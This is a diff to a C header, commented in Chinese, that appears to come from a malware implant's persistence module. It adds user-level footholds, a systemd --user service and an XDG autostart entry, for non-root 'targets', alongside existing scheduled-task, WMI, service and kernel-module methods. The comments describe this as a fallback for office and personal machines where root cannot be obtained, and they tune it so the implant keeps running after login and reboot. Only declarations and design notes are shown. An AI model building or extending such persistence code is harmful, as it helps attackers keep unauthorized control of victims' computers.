@@ -12,7 +12,18 @@ typedef enum {
     PERSIST_SCHTASK,
     PERSIST_WMI,
     PERSIST_SERVICE,
-    PERSIST_LKM
+    PERSIST_LKM,
+    /* ---- 用户级驻留：不需要 root，落在 $HOME 下 ----
+     *
+     * 既有 10 种机制里 Linux 侧全是系统级（写 /etc、/var/spool），在非 root
+     * 目标上**一条都装不上**。而随机目标拿不到 root 的概率很高（办公机、
+     * 个人笔记本，登录用户常非管理员）——那种目标上整套部署此前直接归零。
+     *
+     * 用户级驻留的代价必须如实记录：它只在**该用户登录后**运行，且
+     * systemd --user 默认随会话结束而停（需 loginctl enable-linger 才能
+     * 常驻）。因此它是"拿不到 root 时的降级解"，不是系统级驻留的等价替代。 */
+    PERSIST_USER_SYSTEMD,   /* ~/.config/systemd/user/<name>.service */
+    PERSIST_AUTOSTART       /* ~/.config/autostart/<name>.desktop     */
 } persist_method_t;
 
 #define PERSIST_PLAT_ANY 0
@@ -89,6 +100,25 @@ int persist_linux_ensure(const char *root_prefix,
 
 /* 查询已安装机制数（0..3），参数错误 -1。methods 同 ensure 顺序。 */
 int persist_linux_query(const char *root_prefix,
+                        int *out_methods, size_t nm_methods);
+
+/* ---- 用户级驻留（非 root 目标专用） ---- */
+
+/* 确保用户级驻留：安装 PERSIST_USER_SYSTEMD 与 PERSIST_AUTOSTART 两项。
+ * 落点全部在 $HOME 下（root_prefix 非空时挂在该前缀下，用于测试）。
+ *
+ * 返回 0=新安装，1=已驻留（幂等），-1=一项都没装上（真失败）。
+ * out_methods 顺序：{USER_SYSTEMD, AUTOSTART}。
+ *
+ * 语义刻意与 persist_linux_ensure 对齐：只有"一项都没装上"才算失败。
+ * 部分成功（一项装上）返回 1——因为对用户级驻留而言，任一机制生效即达成
+ * "登录后自启"，判成失败会让调用方拒绝运行，而这正是此前 sshkey 那个
+ * 缺陷的同一形态（已驻留却被判失败）。
+ *
+ * HOME 缺失或不可写时返回 -1：那种情况下两条机制都不可能装上，且错误
+ * 必须在安装阶段暴露，而不是等目标机重启后才发现没起来。 */
+int persist_user_ensure(const char *root_prefix,
+                        char *out_bin_path, size_t cap,
                         int *out_methods, size_t nm_methods);
 
 #endif
